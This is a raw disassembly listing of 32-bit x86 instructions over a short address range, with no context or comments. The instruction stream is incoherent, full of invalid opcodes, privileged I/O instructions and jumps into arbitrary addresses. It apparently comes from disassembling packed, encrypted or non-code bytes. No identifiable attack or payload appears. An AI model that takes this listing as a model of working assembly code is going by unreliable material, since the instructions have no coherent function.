  419bbe:	inc    edx
  419bbf:	mov    al,ds:0x3ac65148
  419bc5:	xchg   ebx,eax
  419bc6:	dec    esp
  419bc7:	jle    0x419bad
  419bc9:	mov    ah,0x4d
  419bcb:	mov    ch,ah
  419bcd:	mov    eax,ds:0x60a58612
  419bd2:	dec    edi
  419bd3:	lock iret 
  419bd5:	out    dx,eax
  419bd6:	dec    ebp
  419bd7:	pop    es
  419bd8:	das    
  419bd9:	jle    0x419c4a
  419bdb:	push   ecx
  419bdc:	lods   eax,DWORD PTR ds:[esi]
  419bdd:	sbb    DWORD PTR [ebx+0x16],edi
  419be0:	repz and eax,0xd22faf00
  419be6:	xchg   edx,eax
  419be7:	mov    al,0xd4
  419be9:	push   cs
  419bea:	xchg   esi,eax
  419beb:	and    DWORD PTR [ecx-0x740d10ed],0x7
  419bf2:	call   0x226e1b40
  419bf7:	ret    
  419bf8:	push   cs
  419bf9:	add    al,0xa1
  419bfb:	sub    esi,eax
  419bfd:	retf   0xd78
  419c00:	mov    ebx,0xec35277
  419c05:	fisub  WORD PTR [edx+esi*8]
  419c08:	dec    esp
  419c09:	push   cs
  419c0a:	cmp    edx,esi
  419c0c:	sub    eax,0xcb862ad0
  419c11:	rcl    BYTE PTR cs:[ebx-0x4a4ffe6a],0x7d
  419c19:	sbb    al,0x9e
  419c1b:	lods   al,BYTE PTR ds:[esi]
  419c1d:	enter  0x860e,0x54
  419c21:	pop    ss
  419c22:	idiv   BYTE PTR [edi-0xc66daf5]
  419c28:	mov    edi,0x3cade07d
  419c2d:	push   cs
  419c2e:	dec    ebp
  419c2f:	adc    ebp,DWORD PTR [ecx]
  419c31:	rcl    DWORD PTR [esi],0x17
  419c34:	ret    0xd35f
  419c37:	sbb    DWORD PTR [ebx+0x3f],esp
  419c3a:	sbb    edi,DWORD PTR [edi-0x53c69b9d]
  419c40:	pop    ecx
  419c41:	into   
  419c42:	cmp    DWORD PTR [edx],edx
  419c44:	jle    0x419c9d
  419c46:	pop    edi
  419c47:	(bad)  
  419c48:	cld    
  419c49:	mov    cl,0x29
  419c4b:	cwde   
  419c4c:	fdiv   st,st(2)
  419c4e:	xchg   ebx,eax
  419c4f:	or     al,BYTE PTR [edx-0x7d]
  419c52:	sub    cl,BYTE PTR [esi]
  419c54:	les    esp,FWORD PTR [ebx]
  419c56:	sub    BYTE PTR [ebx-0x76],dh
  419c59:	aad    0xb3
  419c5b:	sub    esi,DWORD PTR [eax]
  419c5d:	jns    0x419c3c
  419c5f:	arpl   WORD PTR [edi+0x182f74b0],bp
  419c65:	fcmovnu st,st(0)
  419c67:	or     BYTE PTR [edx+0x1c],bl
  419c6a:	sub    BYTE PTR ds:0xae450b9f,bh
  419c70:	int3   
  419c71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c72:	lea    eax,[edi-0x76]
  419c75:	mov    DWORD PTR [ebx-0x4400a084],0xd95c17ee
  419c7f:	fidivr WORD PTR [esi+0x2d]
  419c82:	sti    
  419c83:	mov    BYTE PTR [edx],ch
  419c85:	add    edi,DWORD PTR [ecx-0x1e]
  419c88:	mov    esp,0x9c096cea
  419c8d:	dec    esp
  419c8e:	mov    cl,0xcb
  419c90:	(bad)  
  419c91:	cld    
  419c92:	jl     0x419cd5
  419c94:	daa    
  419c95:	int3   
  419c96:	jmp    0xd4136779
  419c9b:	cmp    DWORD PTR [edi-0x41101c74],ebp
  419ca1:	push   ecx
  419ca2:	or     eax,0xdfb296d9
  419ca7:	add    al,0x7e
  419ca9:	mov    eax,0x56c3897e
  419cae:	mov    ds:0x25f43bbb,al
  419cb3:	mov    ds:0x8a95539c,al
  419cb8:	mul    DWORD PTR [ecx+0x5c]
  419cbb:	xchg   esp,eax
  419cbc:	jl     0x419cd2
  419cbe:	ret    0x9b44
  419cc1:	test   ebp,ebx
  419cc3:	(bad)  
  419cc4:	test   esi,0x4cf50031
  419cca:	mov    eax,0xe72469e1
  419ccf:	push   ds
  419cd0:	(bad)  
  419cd2:	sub    eax,0xc61a500e
  419cd7:	into   
  419cd8:	xor    al,0x4e
  419cda:	sahf   
  419cdb:	(bad)  
  419cdc:	out    0xa1,al
  419cde:	lea    eax,[eax+0xdfb2279]
  419ce4:	cmp    al,0xa5
  419ce6:	nop
  419ce7:	daa    
  419ce8:	cld    
  419ce9:	xchg   ebx,eax
  419cea:	xor    al,0xd
  419cec:	aaa    
  419ced:	push   esp
  419cee:	dec    ebx
  419cef:	sub    BYTE PTR [ecx+0xc],ah
  419cf2:	jp     0x419d27
  419cf4:	jmp    DWORD PTR [edi-0x30]
  419cf7:	lds    eax,FWORD PTR [ecx+0xb]
  419cfa:	sbb    al,BYTE PTR [eax+0x1c678ef3]
  419d00:	dec    esi
  419d01:	push   0x315549ec
  419d06:	mov    eax,DWORD PTR [esi]
  419d08:	sub    bh,dh
  419d0a:	mov    bl,0xb4
  419d0c:	mov    ebx,0xc1c8ca7f
  419d11:	mov    es,WORD PTR [ebp+0x54]
  419d14:	scas   eax,DWORD PTR es:[edi]
  419d15:	mov    edx,0x3579a4f9
  419d1a:	inc    edi
  419d1b:	out    dx,eax
  419d1c:	jp     0x419cff
  419d1e:	test   BYTE PTR [edx+eiz*1+0x66c49595],0x15
  419d26:	xor    al,0xd6
  419d28:	mov    esi,0x85248a07
  419d2d:	or     al,0x2a
  419d2f:	cs mov dh,0x63
  419d32:	inc    ebp
  419d33:	stc    
  419d34:	xlat   BYTE PTR ds:[ebx]
  419d35:	aad    0x61
  419d37:	add    eax,0x9099cb00
  419d3c:	clc    
  419d3d:	loop   0x419d3b
  419d3f:	gs dec ebp
  419d41:	mov    BYTE PTR [esi+eiz*2-0x18],bh
  419d45:	push   ss
  419d46:	nop
  419d47:	jo     0x419dac
  419d49:	out    0x6,eax
  419d4b:	cmp    BYTE PTR [edi-0x59],ch
  419d4e:	fcomip st,st(6)
  419d50:	scas   eax,DWORD PTR es:[edi]
  419d51:	lahf   
  419d52:	pushf  
  419d53:	call   0xebeb:0x2155d3e4
  419d5a:	loop   0x419d1b
  419d5c:	jmp    0x419d6e
  419d5e:	push   ebp
  419d5f:	jae    0x419ddb
  419d61:	pop    edi
  419d62:	jmp    0x419daa
  419d64:	js     0x419d80
  419d66:	mov    ebx,0xeb61a183
  419d6b:	lds    ebp,FWORD PTR [esi]
  419d6d:	imul   ebx,DWORD PTR [edi],0xffffffef
  419d70:	cmp    eax,0x2f5e5ebe
  419d75:	dec    eax
  419d76:	into   
  419d77:	ror    DWORD PTR [ecx],0x1
  419d7a:	call   0x283a:0x3efe612
  419d81:	out    dx,eax
  419d82:	and    ch,BYTE PTR [esi+0x3646f1e8]
  419d88:	scas   al,BYTE PTR es:[edi]
  419d89:	idiv   BYTE PTR [esp]
  419d8c:	push   ds
  419d8d:	pop    eax
  419d8e:	lds    eax,FWORD PTR [esi+ecx*4-0x44]
  419d92:	fs addr16 jbe 0x419e0a
  419d96:	and    eax,0x6a9c822a
  419d9b:	jnp    0x419d23
  419d9d:	repz sub eax,0xfbe9d9c4
  419da3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419da4:	call   0xa6c7:0x92e493ab
  419dab:	call   0x1bb26790
  419db0:	mov    esp,0xf81bdcfd
  419db5:	mov    esi,DWORD PTR [ecx]
  419db7:	jle    0x419ddd
  419db9:	pop    ss
  419dba:	mov    esi,0xf6e7edd7
  419dbf:	push   esp
  419dc0:	iret   
  419dc1:	repnz push ds
  419dc3:	push   edx
  419dc4:	xchg   ebx,eax
  419dc5:	aaa    
  419dc6:	imul   esp,DWORD PTR ds:0x5ae2a49f,0xffffffef
  419dcd:	pop    eax
  419dce:	mov    bh,0xd4
  419dd0:	pop    edi
  419dd1:	(bad)  
  419dd2:	dec    ecx
  419dd3:	lock icebp 
  419dd5:	(bad)  
  419dd6:	jmp    0x419dbb
  419dd8:	push   ss
  419dd9:	es aad 0x39
  419ddc:	and    al,0x83
  419dde:	push   ds
  419ddf:	and    edx,eax
  419de1:	mov    eax,0x3f2856b1
  419de6:	pop    esp
  419de7:	out    dx,al
  419de8:	in     al,0x50
  419dea:	adc    bh,BYTE PTR [edx-0x2e1e5353]
  419df0:	std    
  419df1:	cld    
  419df2:	out    0x44,al
  419df4:	inc    ecx
  419df5:	mov    al,ds:0xcb5772e1
  419dfa:	jge    0x419ddc
  419dfc:	cmp    esi,ebp
  419dfe:	aad    0x62
  419e00:	fnstcw WORD PTR [ebx]
  419e02:	inc    eax
  419e03:	cmp    esp,ebp
  419e05:	inc    ecx
  419e06:	mov    ss,WORD PTR [edx+ebp*4]
  419e09:	inc    ebx
  419e0a:	loopne 0x419e77
  419e0c:	addr16 clc 
  419e0e:	int3   
  419e0f:	enter  0x882d,0x96
  419e13:	xchg   esp,eax
  419e14:	sub    eax,DWORD PTR [ebp-0x605ffb6]
  419e1a:	jmp    0x419e36
  419e1c:	aad    0xbc
  419e1e:	pop    eax
  419e1f:	mov    ch,0x17
  419e21:	lds    esi,FWORD PTR [ebx]
  419e23:	dec    edi
  419e24:	fwait
  419e25:	push   ds
  419e26:	push   ebp
  419e27:	jge    0x419e79
  419e29:	clc    
  419e2a:	ins    BYTE PTR es:[edi],dx
  419e2b:	fistp  DWORD PTR [esi+0x1bef02a0]
  419e31:	(bad)  
  419e32:	inc    ebp
  419e33:	push   esp
  419e34:	cmp    al,0x12
  419e36:	pop    es
  419e37:	push   ebp
  419e38:	or     eax,0xd196e50d
  419e3d:	ffreep st(0)
  419e3f:	scas   eax,DWORD PTR es:[edi]
  419e40:	ds retf 
  419e42:	push   ebp
  419e43:	xchg   BYTE PTR [eax+0x2f5e10e7],bl
  419e49:	mov    edx,esi
  419e4b:	sub    DWORD PTR [esi+0x257e2dae],eax
  419e51:	nop
  419e52:	aas    
  419e53:	cli    
  419e54:	stos   BYTE PTR es:[edi],al
  419e55:	pop    esp
  419e56:	je     0x419df2
  419e58:	retf   0x4710
  419e5b:	rol    DWORD PTR [eax+0x4b640ea5],cl
  419e61:	(bad)  
  419e62:	pop    edi
  419e63:	(bad)  
  419e64:	push   cs
  419e65:	pop    es
  419e66:	cli    
  419e67:	inc    esp
  419e68:	lods   al,BYTE PTR ds:[esi]
  419e69:	bound  edi,QWORD PTR [edi+0x6e7da09d]
  419e6f:	and    DWORD PTR [edi+0x33a327ab],ebp
  419e75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e76:	ficomp DWORD PTR [ebp+0x5]
  419e79:	(bad)  
  419e7a:	sbb    eax,0xfb75baec
  419e7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e80:	dec    edx
  419e81:	xchg   al,bh
  419e83:	xor    eax,esi
  419e85:	mov    edx,0xd5781a50
  419e8a:	sub    al,BYTE PTR [ebp-0x84295f1]
  419e90:	inc    eax
  419e91:	retf   
  419e92:	jnp    0x419ebb
  419e94:	dec    eax
  419e95:	fwait
  419e96:	pop    ss
  419e97:	sahf   
  419e98:	repz pop edx
  419e9a:	mov    cl,0xb2
  419e9c:	sub    edi,DWORD PTR [ecx-0x1d]
  419e9f:	pop    ebp
  419ea0:	mov    ch,0x92
  419ea2:	add    eax,0xf03174c7
  419ea7:	lds    edi,FWORD PTR [edx+ebp*2-0x514f4052]
  419eae:	pusha  
  419eaf:	icebp  
  419eb0:	retf   0x9425
  419eb3:	mov    esi,0x57c61e0b
  419eb8:	cmc    
  419eb9:	mov    eax,ds:0xba2cfa1c
  419ebe:	jno    0x419f19
  419ec0:	les    edi,FWORD PTR [ecx+0x1aebf50c]
  419ec6:	test   eax,0x969277ea
  419ecb:	and    esp,esi
  419ecd:	mov    edi,0x4c16b0db
  419ed2:	mov    ebp,0xb55ca99c
  419ed7:	hlt    
  419ed8:	cmp    eax,DWORD PTR [ecx]
  419eda:	xchg   BYTE PTR ds:[ecx+0x46c4f9c],al
  419ee1:	scas   al,BYTE PTR es:[edi]
  419ee2:	clc    
  419ee3:	ja     0x419efa
  419ee5:	enter  0x6a3,0x88
  419ee9:	retf   
  419eea:	sbb    dh,al
  419eec:	ficomp DWORD PTR ds:0x14b9d8d2
  419ef2:	ror    DWORD PTR [eax+edx*1+0x4a],cl
  419ef6:	cs and eax,0x499bb081
  419efc:	fimul  DWORD PTR [eax-0x5891df75]
  419f02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f03:	cmp    dh,BYTE PTR [edi-0x7b5acfbc]
  419f09:	jbe    0x419ea0
  419f0b:	cmc    
  419f0c:	enter  0xd947,0xf4
  419f10:	jl     0x419f2f
  419f12:	push   es
  419f13:	sti    
  419f14:	shl    BYTE PTR [eax],0xf2
  419f17:	std    
  419f18:	fild   QWORD PTR [ebp-0x24]
  419f1b:	clc    
  419f1c:	in     al,0x75
  419f1e:	scas   eax,DWORD PTR es:[edi]
  419f1f:	bswap  edi
  419f21:	sub    eax,0xe843b4a7
  419f26:	inc    esi
  419f27:	mov    ebx,0x3bd7ff79
  419f2c:	adc    esi,eax
  419f2e:	dec    edi
  419f2f:	sub    DWORD PTR [edi-0x78],ebp
  419f32:	sahf   
  419f33:	ret    0x9e5d
  419f36:	pop    ebx
  419f37:	and    DWORD PTR [edi],0xd0cd113d
  419f3d:	mov    DWORD PTR [esi+edi*4],edx
  419f40:	dec    ebx
  419f41:	and    BYTE PTR [esi],al
  419f43:	sbb    al,0x64
  419f45:	pushf  
  419f46:	call   0xbf442661
  419f4b:	pop    esi
  419f4c:	iret   
  419f4d:	adc    DWORD PTR ds:[esi],ebx
  419f50:	sub    ecx,DWORD PTR [edx]
  419f52:	adc    BYTE PTR [ebp+0x2a82c2b6],cl
  419f58:	fwait
  419f59:	pop    ds
  419f5a:	imul   edi,DWORD PTR ds:0xc9c4d413,0x6e
  419f61:	mov    esi,0xe963de00
  419f66:	gs jbe 0x419f79
  419f69:	retf   
  419f6a:	mov    eax,0x20c984d9
  419f6f:	psrad  mm0,QWORD PTR [edi]
  419f72:	or     edx,eax
  419f74:	cmp    ecx,DWORD PTR [esi-0x5f999133]
  419f7a:	sbb    al,BYTE PTR [eax-0x22]
  419f7d:	mov    cl,0x4c
  419f7f:	jno    0x419fd4
  419f81:	or     dh,bl
  419f83:	fucomip st,st(1)
  419f85:	xchg   esp,eax
  419f86:	add    DWORD PTR [ebx],edi
  419f88:	and    al,0x74
  419f8a:	push   0xffffffc1
  419f8c:	mov    edi,0x87dd2eb1
  419f91:	push   ebp
  419f92:	popf   
  419f93:	mov    eax,DWORD PTR gs:[ebp-0x1c756dc4]
  419f9a:	in     al,dx
  419f9b:	shrd   DWORD PTR [ebx-0x4b],eax,0xda
  419fa0:	and    eax,0xd459cbde
  419fa5:	inc    ecx
  419fa6:	push   ds
  419fa7:	adc    al,0x4b
  419fa9:	adc    bh,bh
  419fab:	jae    0x419fe0
  419fad:	dec    esp
  419fae:	push   0x9
  419fb0:	je     0x419ff7
  419fb2:	(bad)  
  419fb3:	sbb    al,0x46
  419fb5:	cwde   
  419fb6:	dec    ebp
  419fb7:	dec    edi
  419fb8:	mov    dh,0x9d
  419fba:	call   0x6d9f3a33
  419fbf:	imul   ebx,DWORD PTR ss:[esi-0x7e],0x7a
  419fc4:	test   DWORD PTR [ebx-0x68106a25],edx
  419fca:	and    al,0x20
  419fcc:	jp     0x41a004
  419fce:	ret    0x6fe
  419fd1:	xchg   BYTE PTR [eax],dl
  419fd3:	stc    
  419fd4:	scas   al,BYTE PTR es:[edi]
  419fd5:	or     ebp,DWORD PTR [ecx+0x7946397c]
  419fdb:	js     0x419f81
  419fdd:	std    
  419fde:	outs   dx,BYTE PTR ds:[esi]
  419fdf:	xlat   BYTE PTR ds:[ebx]
  419fe0:	ret    0x8e91
  419fe3:	fistp  DWORD PTR [ebx+0x1eb29819]
  419fe9:	pop    es
  419fea:	xchg   ecx,eax
  419feb:	push   esi
  419fec:	(bad)  
  419fed:	hlt    
  419fee:	loop   0x41a066
  419ff0:	push   esp
  419ff1:	pop    ebx
  419ff2:	or     al,0xd1
  419ff4:	dec    edi
  419ff5:	ss ds jge 0x41a03d
  419ff9:	push   ecx
  419ffa:	cmp    eax,0x12ac8e7b
  419fff:	scas   eax,DWORD PTR es:[edi]
  41a000:	dec    ebx
  41a001:	xor    al,0xc7
  41a003:	popf   
  41a004:	jnp    0x41a068
  41a006:	adc    dl,BYTE PTR [ecx+0x410fd7bb]
  41a00c:	jmp    esp
  41a00e:	int3   
  41a00f:	ins    BYTE PTR es:[edi],dx
  41a010:	bound  edx,QWORD PTR [edx-0x59]
  41a013:	cld    
  41a014:	xchg   edx,eax
  41a015:	inc    ebx
  41a016:	jo     0x419fe9
  41a018:	push   esp
  41a019:	lods   eax,DWORD PTR ds:[esi]
  41a01a:	sub    al,0x0
  41a01c:	and    dl,BYTE PTR ds:[esi-0x32]
  41a020:	dec    ebp
  41a021:	jns    0x41a072
  41a023:	adc    BYTE PTR [edx],bh
  41a025:	mov    ebp,0x806fd8a2
  41a02a:	out    0xbb,al
  41a02c:	dec    ebp
  41a02d:	(bad)  
  41a02e:	out    dx,al
  41a02f:	rol    bl,0x8d
  41a032:	fiadd  DWORD PTR [edx+0x73]
  41a035:	mov    bh,0x56
  41a037:	inc    ebp
  41a038:	test   eax,0xe566f305
  41a03d:	lods   eax,DWORD PTR cs:[esi]
  41a03f:	out    0x9f,al
  41a041:	aam    0x24
  41a043:	stos   DWORD PTR es:[edi],eax
  41a044:	hlt    
  41a045:	(bad)  
  41a046:	push   0xffffffa2
  41a048:	cmc    
  41a049:	mov    ebx,0x523126
  41a04e:	fsub   QWORD PTR [ebx]
  41a050:	outs   dx,BYTE PTR ds:[esi]
  41a051:	xor    ecx,edi
  41a053:	adc    bh,BYTE PTR [edx+0x6]
  41a056:	cmp    DWORD PTR [edi+0x8c7bf4c],eax
  41a05c:	pop    ebx
  41a05d:	sub    al,0xba
  41a05f:	jmp    0x44d24c79
  41a064:	int    0xdd
  41a066:	and    DWORD PTR [ebp+0x7],0x9
  41a06a:	add    esi,esi
  41a06c:	je     0x41a02d
  41a06e:	cwde   
  41a06f:	fwait
  41a070:	mov    dl,0xba
  41a072:	loop   0x41a0d8
  41a074:	jmp    0x1d7c:0x733e8ec0
  41a07b:	xchg   ecx,eax
  41a07c:	repnz aam 0xbc
  41a07f:	sbb    cl,BYTE PTR [edi-0x43]
  41a082:	in     eax,0x61
  41a084:	into   
  41a085:	in     eax,0x68
  41a087:	repnz retf 0x7bc3
  41a08b:	sub    eax,0x8135388c
  41a090:	sbb    eax,0x829780c4
  41a095:	fldcw  WORD PTR [edi]
  41a097:	fdiv   QWORD PTR [ebp-0x37083589]
  41a09d:	shr    BYTE PTR [eax+0x75141019],1
  41a0a3:	mov    cs,ecx
  41a0a5:	sbb    eax,0x4910a161
  41a0aa:	push   ss
  41a0ab:	and    esp,edx
  41a0ad:	loopne 0x41a06c
  41a0af:	push   edx
  41a0b0:	das    
  41a0b1:	mov    ebp,0x1cd4ed91
  41a0b6:	push   edx
  41a0b7:	jno    0x41a065
  41a0b9:	mov    edx,0xb7ede4e5
  41a0be:	data16 in al,0x8b
  41a0c1:	add    DWORD PTR [edi-0x66],0x89d3e6d9
  41a0c8:	inc    edx
  41a0c9:	in     al,0x29
  41a0cb:	popa   
  41a0cc:	sbb    al,0x89
  41a0ce:	mov    DWORD PTR [ebx],edx
  41a0d0:	pop    ecx
  41a0d1:	sub    eax,0x2721e26c
  41a0d6:	cwde   
  41a0d7:	ret    0x79b
  41a0da:	jo     0x41a0a9
  41a0dc:	hlt    
  41a0dd:	cmp    al,0xdf
  41a0df:	sar    DWORD PTR [esi+0x9],cl
  41a0e2:	ror    BYTE PTR [edi+0x554b45a7],cl
  41a0e8:	fldcw  WORD PTR [esi-0x48]
  41a0eb:	jbe    0x41a15c
  41a0ed:	cmp    DWORD PTR [edx+0x6ecf050b],esp
  41a0f3:	push   esp
  41a0f4:	pushf  
  41a0f5:	mov    ebp,0x6c8e6eab
  41a0fa:	addr16 mov cl,0x1f
  41a0fd:	addr16 pop esi
  41a0ff:	sbb    DWORD PTR [edx-0x1b67cd37],edi
  41a105:	imul   BYTE PTR [esi]
  41a107:	je     0x41a116
  41a109:	xor    edi,DWORD PTR [eax+0x5194c405]
  41a10f:	xor    al,0x48
  41a111:	arpl   WORD PTR [ebx],di
  41a113:	fsub   QWORD PTR [ecx+0x44840719]
  41a119:	add    ebx,DWORD PTR [edx-0x544d046b]
  41a11f:	sbb    DWORD PTR [eax+eax*8-0x52],esp
  41a123:	iret   
  41a124:	add    esi,esi
  41a126:	xchg   BYTE PTR [ecx+0x4cb6740c],dh
  41a12c:	and    eax,0x6fea43a6
  41a131:	(bad)  
  41a132:	test   DWORD PTR [esi+0x67],0x2e210e6a
  41a139:	mov    eax,ds:0x43f37ec0
  41a13e:	shl    DWORD PTR [edi+0x4],1
  41a141:	(bad)  
  41a142:	idiv   BYTE PTR [ebx]
  41a144:	rcl    edi,0x16
  41a147:	clc    
  41a148:	xor    ch,dh
  41a14a:	loopne 0x41a1b8
  41a14c:	jb     0x41a1a2
  41a14e:	push   0x52
  41a150:	leave  
  41a151:	int3   
  41a152:	cdq    
  41a153:	sti    
  41a154:	mov    ebx,0xb49ef07c
  41a159:	mov    esi,0xe5638952
  41a15e:	fidivr DWORD PTR [ecx]
  41a160:	shl    BYTE PTR [esi+0x746067b2],1
  41a166:	inc    ecx
  41a167:	jl     0x41a16b
  41a169:	mov    al,0xf3
  41a16b:	out    0xf7,al
  41a16d:	in     eax,dx
  41a16e:	push   eax
  41a16f:	xchg   ebx,eax
  41a170:	push   esp
  41a171:	mov    al,0x15
  41a173:	ror    DWORD PTR [esi-0x1c93e5d8],1
  41a179:	pop    esi
  41a17a:	or     DWORD PTR [ecx+eiz*4],0xd4653409
  41a181:	jno    0x41a142
  41a183:	rcl    BYTE PTR [ebx+0x27d8da72],1
  41a189:	bnd js 0x41a207
  41a18c:	mov    eax,0x956fbe77
  41a191:	cld    
  41a192:	test   eax,0x51ea88cc
  41a197:	xchg   esp,eax
  41a198:	leave  
  41a199:	and    bl,0xed
  41a19c:	inc    eax
  41a19d:	idiv   BYTE PTR [ebx+edi*4]
  41a1a0:	imul   edi,DWORD PTR [ebp-0x3e],0x99723f6c
  41a1a7:	xor    DWORD PTR [esi+0x169e2ac1],ecx
  41a1ad:	mov    DWORD PTR ds:0x881a11c3,edx
  41a1b3:	out    dx,eax
  41a1b4:	pop    ds
  41a1b5:	(bad)  [esi]
  41a1b7:	cmp    ah,al
  41a1b9:	mov    ebp,0x9291d0b8
  41a1be:	fwait
  41a1bf:	dec    ebp
  41a1c0:	mov    esi,0x6f595659
  41a1c5:	scas   al,BYTE PTR es:[edi]
  41a1c6:	pop    ecx
  41a1c7:	into   
  41a1c8:	xchg   esp,eax
  41a1c9:	hlt    
  41a1ca:	loope  0x41a1e1
  41a1cc:	lds    ebp,FWORD PTR [esi-0x67]
  41a1cf:	test   DWORD PTR [edx+0xf],ebx
  41a1d2:	test   DWORD PTR [edx+0x17fc1863],ebx
  41a1d8:	jg     0x41a1e8
  41a1da:	repz je 0x41a1ba
  41a1dd:	adc    DWORD PTR [edi-0x32],esi
  41a1e0:	or     al,0xea
  41a1e2:	lods   eax,DWORD PTR ds:[esi]
  41a1e3:	mov    ch,0xf6
  41a1e5:	and    eax,0xa6b12774
  41a1ea:	pop    ebx
  41a1eb:	inc    ebx
  41a1ec:	jns    0x41a211
  41a1ee:	cli    
  41a1ef:	xchg   ebp,eax
  41a1f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1f1:	or     al,0x1b
  41a1f3:	mov    eax,0xd67912db
  41a1f8:	push   eax
  41a1f9:	xlat   BYTE PTR ds:[ebx]
  41a1fa:	sti    
  41a1fb:	enter  0xc337,0x2c
  41a1ff:	sar    esi,0xcd
  41a202:	xchg   edi,eax
  41a203:	test   edx,ebp
  41a205:	leave  
  41a206:	mov    eax,0x88e0c8fb
  41a20b:	jns    0x41a1f5
  41a20d:	cmp    esp,DWORD PTR [ecx-0x5c3624c0]
  41a213:	into   
  41a214:	loopne 0x41a235
  41a216:	call   FWORD PTR [eax+0x459ff282]
  41a21c:	bound  ecx,QWORD PTR [esi+eax*2+0x53]
  41a220:	jns    0x41a292
  41a222:	mov    ecx,0xd38dbdab
  41a227:	push   ss
  41a228:	ss jb  0x41a1b8
  41a22b:	cmp    BYTE PTR [ecx-0x67],ch
  41a22e:	cmc    
  41a22f:	test   DWORD PTR [ebx],edi
  41a231:	ss into 
  41a233:	ret    0x8f53
  41a236:	jmp    0x41a283
  41a238:	mov    bl,0x9e
  41a23a:	sbb    edx,DWORD PTR [edx+0xa95c554]
  41a240:	cdq    
  41a241:	popa   
  41a242:	mov    bh,0xc7
  41a244:	push   esp
  41a245:	or     DWORD PTR [eax],ebp
  41a247:	xor    eax,0x2544ba1
  41a24c:	in     al,0xd9
  41a24e:	enter  0xe76a,0x9
  41a252:	test   DWORD PTR [ecx+eiz*2+0x62735f0b],ebx
  41a259:	shl    DWORD PTR [edx],cl
  41a25b:	jge    0x41a298
  41a25d:	cmp    BYTE PTR [esi],ch
  41a25f:	or     eax,0xe3712ad5
  41a264:	das    
  41a265:	mov    ecx,0xa1b9aff5
  41a26a:	jno    0x41a2e3
  41a26c:	inc    edi
  41a26d:	bound  esi,QWORD PTR [ebp+0x6f]
  41a270:	adc    al,0xf9
  41a272:	icebp  
  41a273:	adc    al,0x5e
  41a275:	out    dx,eax
  41a276:	push   0x2b1c1354
  41a27b:	push   ebp
  41a27c:	mov    ds:0x866a3faa,eax
  41a281:	daa    
  41a282:	into   
  41a283:	push   ds
  41a284:	bound  esi,QWORD PTR [ebp+eiz*1-0x52]
  41a288:	repz xchg ebx,eax
  41a28a:	int3   
  41a28b:	clc    
  41a28c:	xchg   BYTE PTR [ebx+eax*4+0x21],dl
  41a290:	dec    eax
  41a291:	and    BYTE PTR [edi-0x33],ch
  41a294:	test   eax,0xf44c66b1
  41a299:	cs jg  0x41a24e
  41a29c:	in     al,dx
  41a29d:	pusha  
  41a29e:	inc    ecx
  41a29f:	clc    
  41a2a0:	jno    0x41a22a
  41a2a2:	js     0x41a2e3
  41a2a4:	rcr    DWORD PTR ds:0xb2e7fe86,1
  41a2aa:	mov    ds:0xd890f40e,eax
  41a2af:	shr    DWORD PTR [esi+0x14],0x89
  41a2b3:	ss push eax
  41a2b5:	(bad)  
  41a2b6:	jp     0x41a2c5
  41a2b8:	jmp    0x2ad451b5
  41a2bd:	xchg   esi,eax
  41a2be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2bf:	or     esi,DWORD PTR [edi-0x29]
  41a2c2:	rcl    DWORD PTR [esi-0x62],1
  41a2c5:	xchg   edi,eax
  41a2c6:	mov    cs,ebp
  41a2c8:	add    eax,0xda1cb33
  41a2cd:	xchg   edi,eax
  41a2ce:	sub    DWORD PTR [ecx+0x43],0x57c3ac95
  41a2d5:	shl    edx,1
  41a2d7:	js     0x41a309
  41a2d9:	popf   
  41a2da:	imul   BYTE PTR ds:[ebp-0x21]
  41a2de:	cmp    al,0x30
  41a2e0:	bound  esp,QWORD PTR [ecx+0x7e]
  41a2e3:	cmc    
  41a2e4:	xchg   edi,eax
  41a2e5:	push   ds
  41a2e6:	and    eax,0xae4195b
  41a2eb:	(bad)  
  41a2ec:	mov    ecx,0x3e3c092f
  41a2f1:	push   ebp
  41a2f2:	stos   BYTE PTR es:[edi],al
  41a2f3:	or     eax,0x7cd91d71
  41a2f8:	add    edx,eax
  41a2fa:	enter  0x4967,0x65
  41a2fe:	adc    eax,DWORD PTR [edx+0x5c7f9a7c]
  41a304:	sbb    bl,BYTE PTR [ebx]
  41a306:	loope  0x41a2b2
  41a308:	inc    ecx
  41a309:	pop    ebx
  41a30a:	or     BYTE PTR [ebx],ch
  41a30c:	test   eax,0x31c24b3a
  41a311:	hlt    
  41a312:	jae    0x41a375
  41a314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a315:	into   
  41a316:	mov    eax,DWORD PTR [edx+0x63]
  41a319:	push   ebx
  41a31a:	adc    eax,DWORD PTR ds:0x1dcfd703
  41a320:	scas   eax,DWORD PTR es:[edi]
  41a321:	or     al,0x43
  41a323:	mov    BYTE PTR [ecx],ah
  41a325:	push   cs
  41a326:	enter  0xdeed,0xe2
  41a32a:	scas   al,BYTE PTR es:[edi]
  41a32b:	bound  eax,QWORD PTR [edi-0x79332587]
  41a331:	aam    0xf5
  41a333:	and    eax,0x86c88f56
  41a338:	add    DWORD PTR [edi+0x4f83fa0d],ebp
  41a33e:	pop    ds
  41a33f:	inc    esi
  41a340:	stos   DWORD PTR es:[edi],eax
  41a341:	mov    bh,0xff
  41a343:	rcl    DWORD PTR [eax-0x3d],1
  41a346:	adc    BYTE PTR [esi+ebx*4-0x3],dh
  41a34a:	test   esp,eax
  41a34c:	jae    0x41a312
  41a34e:	pop    ebp
  41a34f:	mov    bl,dh
  41a351:	call   0xdec0:0x5d28d38d
  41a358:	cmp    al,0x3
  41a35a:	fist   WORD PTR [ebx-0x2c98d049]
  41a360:	xchg   edi,eax
  41a361:	ins    BYTE PTR es:[edi],dx
  41a362:	jb     0x41a3c3
  41a364:	inc    ecx
  41a365:	push   edx
  41a366:	cmp    al,0x4
  41a368:	inc    DWORD PTR [edi+0x4b]
  41a36b:	mov    al,0x15
  41a36d:	sub    BYTE PTR [eax-0x38dec19f],dl
  41a373:	(bad)  
  41a374:	sar    BYTE PTR [ecx],1
  41a376:	nop
  41a377:	inc    edi
  41a378:	push   ss
  41a379:	(bad)
  41a37d:	mov    al,0xda
  41a37f:	sbb    DWORD PTR [edx],0xffffff9c
  41a382:	test   al,0x50
  41a384:	push   edi
